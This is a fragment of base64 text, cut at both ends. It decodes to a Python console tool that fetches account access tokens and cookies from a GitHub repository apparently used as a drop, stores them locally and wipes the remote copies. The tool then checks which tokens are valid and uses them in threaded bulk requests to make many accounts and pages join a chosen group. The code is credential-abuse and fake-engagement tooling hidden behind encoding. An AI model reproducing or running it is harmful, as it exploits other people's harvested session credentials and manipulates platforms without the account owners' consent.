oKIyBZb3VyIEdpdEh1YiB0b2tlbgp0b2tlbiA9ICcnCgojIEdpdEh1YiBBUEkgaGVhZGVycwpoZWFkZXJzID0gewogICAgJ0F1dGhvcml6YXRpb24nOiBmJ3Rva2VuIHt0b2tlbn0nLAogICAgJ0FjY2VwdCc6ICdhcHBsaWNhdGlvbi92bmQuZ2l0aHViLnYzK2pzb24nCn0KCiMgRGVmaW5lIGZpbGUgb3B0aW9ucyBmb3Igc3RvcmluZyB0b2tlbnMKZmlsZV9vcHRpb25zID0gewogICAgMTogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFBQ0NPVU5ULnR4dCIsCiAgICAyOiAiL3NkY2FyZC9ib29zdHBoZXJlL0ZSQVBBR0VTLnR4dCIsCiAgICAzOiAiL3NkY2FyZC9ib29zdHBoZXJlL1JQV0FDQ09VTlQudHh0IiwKICAgIDQ6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXUEFHRVMudHh0Igp9CgpkZWYgZ2l0KHJlcG9fb3duZXIsIHJlcG9fbmFtZSwgZmlsZV9wYXRoKToKICAgICMgR2l0SHViIEFQSSBVUkwgZm9yIGZpbGUgY29udGVudAogICAgZmlsZV91cmwgPSBmJ2h0dHBzOi8vYXBpLmdpdGh1Yi5jb20vcmVwb3Mve3JlcG9fb3duZXJ9L3tyZXBvX25hbWV9L2NvbnRlbnRzL3tmaWxlX3BhdGh9JwoKICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KGZpbGVfdXJsLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAKICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICBjb250ZW50ID0gcmVzcG9uc2UuanNvbigpCiAgICAgICAgZmlsZV9zaGEgPSBjb250ZW50WydzaGEnXQogICAgICAgIGZpbGVfY29udGVudCA9IGJhc2U2NC5iNjRkZWNvZGUoY29udGVudFsnY29udGVudCddKS5kZWNvZGUoJ3V0Zi04JykKICAgICAgICByZXR1cm4gZmlsZV9jb250ZW50LCBmaWxlX3NoYQogICAgZWxpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSA0MDQ6CiAgICAgICAgcHJpbnQoZiIgICAgIEZBSUxFRCIpCiAgICAgICAgcmV0dXJuIE5vbmUsIE5vbmUKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoZiIgICAgIEZBSUxFRCIpCiAgICAgICAgcmV0dXJuIE5vbmUsIE5vbmUKCmRlZiBjb250aW50KHJlcG9fb3duZXIsIHJlcG9fbmFtZSwgZmlsZV9wYXRoLCBmaWxlX3NoYSk6CiAgICAjIEdpdEh1YiBBUEkgVVJMIGZvciB1cGRhdGluZyB0aGUgZmlsZSBjb250ZW50IChjbGVhcmluZyB0aGUgZmlsZSkKICAgIGZpbGVfdXJsID0gZidodHRwczovL2FwaS5naXRodWIuY29tL3JlcG9zL3tyZXBvX293bmVyfS97cmVwb19uYW1lfS9jb250ZW50cy97ZmlsZV9wYXRofScKICAgIAogICAgZW1wdHlfY29udGVudCA9IGJhc2U2NC5iNjRlbmNvZGUoJycuZW5jb2RlKCd1dGYtOCcpKS5kZWNvZGUoJ3V0Zi04JykKICAgIGNvbW1pdF9tZXNzYWdlID0gZiJDbGVhciB7ZmlsZV9wYXRofSIKCiAgICBkYXRhID0gewogICAgICAgICJtZXNzYWdlIjogY29tbWl0X21lc3NhZ2UsCiAgICAgICAgImNvbnRlbnQiOiBlbXB0eV9jb250ZW50LAogICAgICAgICJzaGEiOiBmaWxlX3NoYQogICAgfQoKICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucHV0KGZpbGVfdXJsLCBqc29uPWRhdGEsIGhlYWRlcnM9aGVhZGVycykKICAgIAogICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgIHBhc3MKICAgIGVsc2U6CiAgICAgICAgcGFzcwoKZGVmIGNob29zZV9maWxlX3BhdGgoKToKICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBwcmludChmIiIiICAgICBcMDMzWzE7MzdtQ0hPT1NFIFRZUEUgT0YgRklMRSBUTyBTQVZFIFRPS0VOUzogCiAgICAgXDAzM1sxOzM0bVsxXSBcMDMzWzE7MzJtRlJBIEFDQ09VTlQgCiAgICAgXDAzM1sxOzM0bVsyXSBcMDMzWzE7MzJtRlJBIFBBR0VTCiAgICAgXDAzM1sxOzM0bVszXSBcMDMzWzE7MzJtUlBXIEFDQ09VTlQKICAgICBcMDMzWzE7MzRtWzRdIFwwMzNbMTszMm1SUFcgUEFHRVMKICAgICBcMDMzWzE7MzFtWzBdIFwwMzNbMTszMW1FWElUIAogICAgXDAzM1sxOzMxbeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iIiIpCgogICAgIyBBc2sgdGhlIHVzZXIgdG8gZW50ZXIgdGhlaXIgY2hvaWNlCiAgICBjaG9pY2UgPSBpbnQoaW5wdXQoZiIgICAgIHtyZWR9RU5URVIgTlVNQkVSIHt3aGl0ZX06ICIpKQogICAgCiAgICBpZiBjaG9pY2UgPT0gMDoKICAgICAgICBwcmludCgiRXhpdGluZyB0aGUgcHJvZ3JhbS4iKQogICAgICAgIGV4aXQoKSAgIyBFeGl0IHRoZSBwcm9ncmFtIGlmIHRoZSB1c2VyIGNob29zZXMgMAogICAgZWxpZiBjaG9pY2UgaW4gZmlsZV9vcHRpb25zOgogICAgICAgIHJldHVybiBmaWxlX29wdGlvbnNbY2hvaWNlXSAgIyBSZXR1cm4gdGhlIHNlbGVjdGVkIGZpbGUgcGF0aAogICAgZWxzZToKICAgICAgICBwcmludCgiSW52YWxpZCBjaG9pY2UuIFBsZWFzZSB0cnkgYWdhaW4uIikKICAgICAgICByZXR1cm4gY2hvb3NlX2ZpbGVfcGF0aCgpICAjIFJldHJ5IGlmIHRoZSBjaG9pY2UgaXMgaW52YWxpZAoKZGVmIGN5bnQoY29udGVudCk6CiAgICAjIENvdW50IHRoZSBudW1iZXIgb2YgdG9rZW5zIGJ5IHNwbGl0dGluZyB0aGUgY29udGVudCBpbnRvIGxpbmVzCiAgICB0b2tlbnMgPSBjb250ZW50LnNwbGl0bGluZXMoKQogICAgcmV0dXJuIGxlbih0b2tlbnMpCgpkZWYgY291bnRfY29va2llcyhjb29raWVzX2NvbnRlbnQpOgogICAgIyBDb3VudCB0aGUgbnVtYmVyIG9mIGNvb2tpZXMgYnkgc3BsaXR0aW5nIHRoZSBjb250ZW50IGludG8gbGluZXMKICAgIGNvb2tpZXMgPSBjb29raWVzX2NvbnRlbnQuc3BsaXRsaW5lcygpCiAgICByZXR1cm4gbGVuKGNvb2tpZXMpCgpkZWYgZ2l0aHVidG9rcygpOgogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIHJlcG9fb3duZXIgPSAnYm9vc3RwaGVyZScgICMgQ2hhbmdlIHRoaXMgdG8geW91ciBHaXRIdWIgdXNlcm5hbWUKICAgIAogICAgcmVwb19uYW1lID0gaW5wdXQoZiIgICAge3llbGxvd31DT0RFOiAiKQoKICAgICMgRmV0Y2ggY29udGVudHMgb2YgdGhlIFRva2VucyBmaWxlCiAgICB0b2tlbnNfY29udGVudCwgdG9rZW5zX3NoYSA9IGdpdChyZXBvX293bmVyLCByZXBvX25hbWUsICdUb2tlbnMnKQogICAgaWYgdG9rZW5zX2NvbnRlbnQ6CiAgICAgICAgdG9rZW5fY291bnQgPSBjeW50KHRva2Vuc19jb250ZW50KQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIHByaW50KGYiICAgICAgIHtyZWR9e3Rva2VuX2NvdW50fSB7Z3JlZW59VE9LRU5TIEZPVU5EICEiKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgICMgQXNrIHRoZSB1c2VyIHdoZXJlIHRvIHN0b3JlIHRoZSB0b2tlbnMKICAgICAgICBzdG9yYWdlX3BhdGggPSBjaG9vc2VfZmlsZV9wYXRoKCkKICAgICAgICB3aXRoIG9wZW4oc3RvcmFnZV9wYXRoLCAnYScpIGFzIGZpbGU6CgogICAgICAgICAgIGZpbGUud3JpdGUodG9rZW5zX2NvbnRlbnQgKyAnXG4nKSAgIyBBcHBlbmQgbmV3IHRva2VucyB0byB0aGUgZmlsZQoKICAgICAgICAKICAgICAgICAjIENsZWFyIHRoZSBUb2tlbnMgZmlsZQogICAgICAgIGNvbnRpbnQocmVwb19vd25lciwgcmVwb19uYW1lLCAnVG9rZW5zJywgdG9rZW5zX3NoYSkKCiAgICAjIEZldGNoIGNvbnRlbnRzIG9mIHRoZSBDb29raWVzIGZpbGUKICAgIGNvb2tpZXNfY29udGVudCwgY29va2llc19zaGEgPSBnaXQocmVwb19vd25lciwgcmVwb19uYW1lLCAnQ29va2llcycpCiAgICAKICAgIGlmIGNvb2tpZXNfY29udGVudDoKICAgICAgICBjb29raWVfY291bnQgPSBjb3VudF9jb29raWVzKGNvb2tpZXNfY29udGVudCkKICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBwcmludChmIiAgICAgICB7cmVkfXtjb29raWVfY291bnR9IHtncmVlbn1DT09LSUVTIEZPVU5EICEiKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgICMgQXNrIHRoZSB1c2VyIHdoZXJlIHRvIHN0b3JlIHRoZSBjb29raWVzCiAgICAgICAgY29va2llX3BhdGggPSBpbnB1dCgiUEFUSCBUTyBTQVZFIENPT0tJRVM6ICIpCiAgICAgICAgd2l0aCBvcGVuKGNvb2tpZV9wYXRoLCAnYScpIGFzIGNvb2tpZV9maWxlOgoKICAgICAgICAgICAgY29va2llX2ZpbGUud3JpdGUoY29va2llc19jb250ZW50ICsgJ1xuJykgICMgQXBwZW5kIG5ldyBjb29raWVzIHRvIHRoZSBmaWxlCgogICAgICAgIAogICAgICAgICMgQ2xlYXIgdGhlIENvb2tpZXMgZmlsZQogICAgICAgIGNvbnRpbnQocmVwb19vd25lciwgcmVwb19uYW1lLCAnQ29va2llcycsIGNvb2tpZXNfc2hhKQogICAgZWxzZToKICAgICAgICBwYXNzCgoKCgoKZGVmIGNoZWNrKCk6CiAgICBjbGVhcl9zY3JlZW4oKQogICAgam92YW4oKQogICAgZmlsZV9vcHRpb25zID0gewogICAgICAgIDE6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvRlJBQUNDT1VOVC50eHQiLAogICAgICAgIDI6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvRlJBUEFHRVMudHh0IiwKICAgICAgICAzOiAiL3NkY2FyZC9ib29zdHBoZXJlL1JQV0FDQ09VTlQudHh0IiwKICAgICAgICA0OiAiL3NkY2FyZC9ib29zdHBoZXJlL1JQV1BBR0VTLnR4dCIKICAgIH0KCiAgICAjIERpc3BsYXkgdGhlIGF2YWlsYWJsZSBmaWxlIG9wdGlvbnMKICAgIHByaW50KGYiIiIgICAgIFwwMzNbMTszN21DSE9PU0UgVFlQRSBPRiBGSUxFIFRPIFZFUklGWTogCiAgICAgXDAzM1sxOzM0bVsxXSBcMDMzWzE7MzJtRlJBIEFDQ09VTlQgCiAgICAgXDAzM1sxOzM0bVsyXSBcMDMzWzE7MzJtRlJBIFBBR0VTCiAgICAgXDAzM1sxOzM0bVszXSBcMDMzWzE7MzJtUlBXIEFDQ09VTlQKICAgICBcMDMzWzE7MzRtWzRdIFwwMzNbMTszMm1SUFcgUEFHRVMKICAgICBcMDMzWzE7MzFtWzBdIFwwMzNbMTszMW1FWElUIAogICAgXDAzM1sxOzMxbeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iIiIpCgogICAgY2hvaWNlID0gaW50KGlucHV0KGYiICAgICB7Z3JlZW59RW50ZXIgeW91ciBjaG9pY2U6ICIpKQogICAgaWYgY2hvaWNlIGluIGZpbGVfb3B0aW9uczoKICAgICAgICBmaWxlX3BhdGggPSBmaWxlX29wdGlvbnNbY2hvaWNlXQogICAgZWxpZiBjaG9pY2UgPT0gMDoKICAgICAgICBwcmludCgiRXhpdGluZy4uLiIpCiAgICAgICAgcmV0dXJuCiAgICBlbHNlOgogICAgICAgIHByaW50KCJJbnZhbGlkIGNob2ljZS4gRXhpdGluZy4uLiIpCiAgICAgICAgcmV0dXJuCgogICAgIyBSZWFkIHRoZSB0b2tlbnMgZnJvbSB0aGUgc2VsZWN0ZWQgZmlsZQogICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3InKSBhcyBmaWxlOgogICAgICAgIGxpbmVzID0gZmlsZS5yZWFkbGluZXMoKQoKICAgIHZhbGlkX3Rva2VucyA9IFtdCiAgICAKICAgICMgVmFsaWRhdGUgZWFjaCB0b2tlbiBhbmQga2VlcCB2YWxpZCBvbmVzCiAgICBmb3IgbGluZSBpbiBsaW5lczoKICAgICAgICB1aWQsIHRva2VuID0gbGluZS5zdHJpcCgpLnNwbGl0KCd8JykKICAgICAgICBpZiB2YWwodG9rZW4pOgogICAgICAgICAgICB2YWxpZF90b2tlbnMuYXBwZW5kKGxpbmUuc3RyaXAoKSkKICAgICAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgIHByaW50KGYiICAgICB7Z3JlZW59QUNDT1VOVCDilIDilIDilIDilIDilIA+IHtibHVlfXt1aWR9IHt3aGl0ZX09IHt5ZWxsb3d9IElTIFZBTElEIikKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICAgICAgcHJpbnQoZiIgICAgIHtyZWR9QUNDT1VOVCDilIDilIDilIDilIDilIA+IHtibHVlfXt1aWR9IHt3aGl0ZX09IHt5ZWxsb3d9IElTIE5PVCBWQUxJRCBBTkQgV0lMTCBCRSBSRU1PVkVEIikKCiAgICAjIFdyaXRlIHRoZSB2YWxpZCB0b2tlbnMgYmFjayB0byB0aGUgZmlsZQogICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3cnKSBhcyBmaWxlOgogICAgICAgIGZvciB2YWxpZF90b2tlbiBpbiB2YWxpZF90b2tlbnM6CiAgICAgICAgICAgIGZpbGUud3JpdGUodmFsaWRfdG9rZW4gKyAnXG4nKQoKICAgIAoKCmRlZiBwZXJmb3JtX2dyb3VwX2pvaW4oKToKICAgICIiIlBlcmZvcm0gZ3JvdXAgam9pbnMgYmFzZWQgb24gdXNlciBpbnB1dCBmb3IgZmlsZSBjaG9pY2UsIGdyb3VwIElELCBhbmQgbnVtYmVyIG9mIHRva2Vucy4iIiIKICAgIAogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIGZpbGVfb3B0aW9ucyA9IHsKICAgICAgICAxOiAiL3NkY2FyZC9ib29zdHBoZXJlL0ZSQUFDQ09VTlQudHh0IiwKICAgICAgICAyOiAiL3NkY2FyZC9ib29zdHBoZXJlL0ZSQVBBR0VTLnR4dCIsCiAgICAgICAgMzogIi9zZGNhcmQvYm9vc3RwaGVyZS9SUFdBQ0NPVU5ULnR4dCIsCiAgICAgICAgNDogIi9zZGNhcmQvYm9vc3RwaGVyZS9SUFdQQUdFUy50eHQiCiAgICB9CiAgICAKICAgICMgRGlzcGxheSB0aGUgYXZhaWxhYmxlIGZpbGUgb3B0aW9ucwogICAgcHJpbnQoZiIiIiAgICAgXDAzM1sxOzM3bUNIT09TRSBUWVBFIE9GIEFDQ09VTlRTIFRPIEpPSU4gR1JPVVA6IAogICAgIFwwMzNbMTszNG1bMV0gXDAzM1sxOzMybUZSQSBBQ0NPVU5UIAogICAgIFwwMzNbMTszNG1bMl0gXDAzM1sxOzMybUZSQSBQQUdFUwogICAgIFwwMzNbMTszNG1bM10gXDAzM1sxOzMybVJQVyBBQ0NPVU5UCiAgICAgXDAzM1sxOzM0bVs0XSBcMDMzWzE7MzJtUlBXIFBBR0VTCiAgICAgXDAzM1sxOzMxbVswXSBcMDMzWzE7MzFtRVhJVCAKICAgIFwwMzNbMTszMW3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIiIiKQoKICAgIHRyeToKICAgICAgICBmaWxlX2Nob2ljZSA9IGludChpbnB1dCgiICAgXDAzM1sxOzMybUNob29zZTogIikpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgaWYgZmlsZV9jaG9pY2Ugbm90IGluIGZpbGVfb3B0aW9uczoKICAgICAgICAgICAgcHJpbnQoIkludmFsaWQgY2hvaWNlLiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGZpbGVfcGF0aCA9IGZpbGVfb3B0aW9uc1tmaWxlX2Nob2ljZV0KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KCiAgICAjIFN0ZXAgMjogTG9hZCB0aGUgdG9rZW5zIGZyb20gdGhlIHNlbGVjdGVkIGZpbGUKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIHRva2VucyA9IFtsaW5lLnN0cmlwKCkgZm9yIGxpbmUgaW4gZmlsZS5yZWFkbGluZXMoKSBpZiBsaW5lLnN0cmlwKCldICAjIEVuc3VyZSBubyBlbXB0eSBsaW5lcwogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgIHByaW50KCJGaWxlIG5vdCBmb3VuZC4iKQogICAgICAgIHJldHVybgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiRXJyb3IgbG9hZGluZyB0b2tlbnM6IHtlfSIpCiAgICAgICAgcmV0dXJuCgogICAgYXZhaWxhYmxlX3Rva2VucyA9IGxlbih0b2tlbnMpCgogICAgIyBTdGVwIDM6IEFzayB0aGUgdXNlciBmb3IgdGhlIHN0YXJ0aW5nIGxpbmUKICAgIGlmIGF2YWlsYWJsZV90b2tlbnMgPT0gMDoKICAgICAgICBwcmludCgiTm8gdG9rZW5zIGF2YWlsYWJsZSBmcm9tIHRoZSBzZWxlY3RlZCBmaWxlLiIpCiAgICAgICAgcmV0dXJuCgogICAgdHJ5OgogICAgICAgIHN0YXJ0X2xpbmUgPSBpbnQoaW5wdXQoZiIgICBcMDMzWzE7MzJtRW50ZXIgdGhlIHN0YXJ0aW5nIGxpbmUgKDEgdG8ge2F2YWlsYWJsZV90b2tlbnN9KTogIikpCiAgICAgICAgcHJpbnQoZiIgICAge3JlZH3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBpZiBzdGFydF9saW5lIDwgMSBvciBzdGFydF9saW5lID4gYXZhaWxhYmxlX3Rva2VuczoKICAgICAgICAgICAgcHJpbnQoZiJQbGVhc2UgZW50ZXIgYSB2YWxpZCBsaW5lIG51bWJlciBiZXR3ZWVuIDEgYW5kIHthdmFpbGFibGVfdG9rZW5zfS4iKQogICAgICAgICAgICByZXR1cm4KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KCiAgICB0b2tlbnMgPSB0b2tlbnNbc3RhcnRfbGluZSAtIDE6XQoKICAgICMgU3RlcCA0OiBBc2sgdGhlIHVzZXIgZm9yIHRoZSBncm91cCBJRAogICAgZ3JvdXBfaWQgPSBpbnB1dChmIiAgIHt5ZWxsb3d9WzE7MzJtRW50ZXIgdGhlIGdyb3VwIElEOiAiKQogICAgcHJpbnQoZiIgICAge3JlZH3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKCiAgICAjIFN0ZXAgNTogQXNrIHRoZSB1c2VyIGZvciB0aGUgbnVtYmVyIG9mIHRva2VucyB0byBwcm9jZXNzCiAgICB0cnk6CiAgICAgICAgbnVtX3Rva2VucyA9IGludChpbnB1dChmIiAgIFwwMzNbMTszMm1FbnRlciBMaW1pdDogIikpCiAgICAgICAgcHJpbnQoZiIgICAge3JlZH3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIgZm9yIHRva2Vucy4iKQogICAgICAgIHJldHVybgoKICAgICMgU3RlcCA2OiBDaGVjayBpZiB0aGUgcmVxdWVzdGVkIG51bWJlciBvZiB0b2tlbnMgZXhjZWVkcyB0aGUgYXZhaWxhYmxlIHRva2VucwogICAgaWYgbnVtX3Rva2VucyA+IGxlbih0b2tlbnMpOgogICAgICAgIHByaW50KGYiXDAzM1sxOzMxbUVSUk9SOiBOdW1iZXIgZXhjZWVkcyBhdmFpbGFibGUgdG9rZW5zICh7bGVuKHRva2Vucyl9KS4iKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIHJldHVybgoKICAgICMgU3RlcCA3OiBKb2luIHRoZSBncm91cCB1c2luZyBtdWx0aXRocmVhZGluZyBhbmQgZHluYW1pYyBwcm9maWxlIElEIHJldHJpZXZhbAogICAgam9pbl9jb3VudCA9IDAKICAgIGZhaWxlZF9jb3VudCA9IDAKICAgIHJldHJpZXNfbGVmdCA9IG51bV90b2tlbnMgICMgVGhlIG51bWJlciBvZiByZXRyaWVzIGxlZnQgdG8gcGVyZm9ybQogICAgbWF4X3dvcmtlcnMgPSAxMCAgIyBTZXQgbWF4aW11bSBudW1iZXIgb2YgdGhyZWFkcwogICAgcmVzdWx0cyA9IFtdCgogICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9bWF4X3dvcmtlcnMpIGFzIGV4ZWN1dG9yOgogICAgICAgIGZ1dHVyZV90b190b2tlbiA9IHt9CiAgICAgICAgCiAgICAgICAgIyBBdHRlbXB0IHRvIGpvaW4gdGhlIGdyb3VwIGZvciB0aGUgc3BlY2lmaWVkIG51bWJlciBvZiB0b2tlbnMKICAgICAgICB3aGlsZSBqb2luX2NvdW50IDwgbnVtX3Rva2VucyBhbmQgcmV0cmllc19sZWZ0ID4gMDoKICAgICAgICAgICAgZm9yIHRva2VuIGluIHRva2Vuc1s6cmV0cmllc19sZWZ0XToKICAgICAgICAgICAgICAgIGFjY2Vzc190b2tlbiA9IHRva2VuLnNwbGl0KCd8JylbMV0KICAgICAgICAgICAgICAgIHByb2ZpbGVfaWQgPSBnZXRfcHJvZmlsZV9pZChhY2Nlc3NfdG9rZW4pCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIHByb2ZpbGVfaWQ6CiAgICAgICAgICAgICAgICAgICAgZnV0dXJlID0gZXhlY3V0b3Iuc3VibWl0KGpvaW5fZ3JvdXAsIGdyb3VwX2lkLCBwcm9maWxlX2lkLCBhY2Nlc3NfdG9rZW4pCiAgICAgICAgICAgICAgICAgICAgZnV0dXJlX3RvX3Rva2VuW2Z1dHVyZV0gPSB0b2tlbgogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChmIlwwMzNbMTszMW1bRkFJTEVEXSBcMDMzWzE7MzdtRmFpbGVkIHRvIHJldHJpZXZlIHByb2ZpbGUgSUQgZm9yIHRva2VuIFwwMzNbMTszM217dG9rZW59XDAzM1swbSIpCgogICAgICAgICAgICAjIFByb2Nlc3MgdGhlIHJlc3VsdHMgb2YgdGhlIGpvaW5zCiAgICAgICAgICAgIGZvciBmdXR1cmUgaW4gYXNfY2